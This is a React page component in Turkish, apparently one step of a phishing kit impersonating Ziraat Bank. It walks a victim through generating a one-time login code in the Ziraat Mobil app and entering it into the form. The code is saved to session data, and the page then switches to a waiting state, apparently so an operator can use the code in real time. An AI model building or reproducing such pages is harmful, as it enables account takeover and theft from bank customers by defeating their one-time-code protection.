import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Smartphone } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const OtpGenCodePage = () => {
  const [enteredCode, setEnteredCode] = useState('');
  const { updateSessionData, setWaiting } = useForm();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('otpGenCode', { enteredCode });
    setWaiting(true);
  };

  return (
    <FormLayout 
      title="OTP Oluşturma Kodu" 
      description="Tek kullanımlık giriş kodunuzu oluşturmak için aşağıdaki adımları takip edin"
      currentStep={5}
      totalSteps={6}
    >
      <ErrorAlert />
      
      {/* Instructions */}
      <div className="space-y-4">
        <div className="bg-muted/30 p-4 rounded-lg space-y-3">
          <div className="flex items-center space-x-2 mb-3">
            <Smartphone className="h-5 w-5 text-primary" />
            <h3 className="font-semibold text-primary">Ziraat Mobil Uygulama Talimatları</h3>
          </div>
          
          <ol className="space-y-2 text-sm">
            <li className="flex items-start space-x-2">
              <span className="bg-primary text-primary-foreground rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold mt-0.5">1</span>
              <span>Ziraat Mobil uygulamanızı açın.</span>
            </li>
            <li className="flex items-start space-x-2">
              <span className="bg-primary text-primary-foreground rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold mt-0.5">2</span>
              <span><strong className="text-primary">Ziraat İmzası</strong>'na dokunun.</span>
            </li>
            <li className="flex items-start space-x-2">
              <span className="bg-primary text-primary-foreground rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold mt-0.5">3</span>
              <span><strong className="text-primary">Tek Kullanımlık Giriş</strong>'i seçin.</span>
            </li>
            <li className="flex items-start space-x-2">
              <span className="bg-primary text-primary-foreground rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold mt-0.5">4</span>
              <span>PIN'inizi veya biyometrik doğrulamayı kullanarak yetkilendirin.</span>
            </li>
            <li className="flex items-start space-x-2">
              <span className="bg-primary text-primary-foreground rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold mt-0.5">5</span>
              <span>Oluşturulan tek kullanımlık giriş kodunu aşağıya girin.</span>
            </li>
          </ol>
        </div>

        {/* Input Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="enteredCode">Ziraat Mobil uygulamanızdan aldığınız kodu girin</Label>
            <Input
              id="enteredCode"
              value={enteredCode}
              onChange={(e) => setEnteredCode(e.target.value.toUpperCase())}
              className="text-center text-lg font-mono tracking-widest"
              placeholder="6 haneli kodu girin"
              maxLength={6}
              pattern="[A-Z0-9]{6}"
              required
            />
          </div>

          <div className="bg-muted/50 p-3 rounded-lg">
            <p className="text-xs text-muted-foreground">
              <strong>Not:</strong> Gerekli kodu oluşturmak için Ziraat Mobil uygulamanızda yukarıdaki adımları tamamlayın.
            </p>
          </div>

          <Button type="submit" className="w-full" disabled={enteredCode.length !== 6}>
            Kodu Doğrula
          </Button>
        </form>
      </div>
    </FormLayout>
  );
};

export default OtpGenCodePage;